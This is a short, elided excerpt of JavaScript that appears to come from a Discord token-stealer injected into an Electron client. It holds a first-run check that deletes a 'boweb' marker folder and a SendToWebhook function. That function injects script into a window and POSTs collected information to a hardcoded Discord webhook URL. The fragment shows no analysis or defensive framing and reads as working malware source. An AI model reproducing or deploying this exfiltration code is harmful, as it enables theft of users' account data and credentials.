...
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "boweb"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "boweb"));
...
function SendToWebhook(info) {
    ...
    `, !0)
    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/857942761625223188/ACTU6bNnBqDjl33KUyaeK2AGk9umQj3KQPCkmy10RKzuC4IZDAeDKc5yjfSrmomDKufT", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
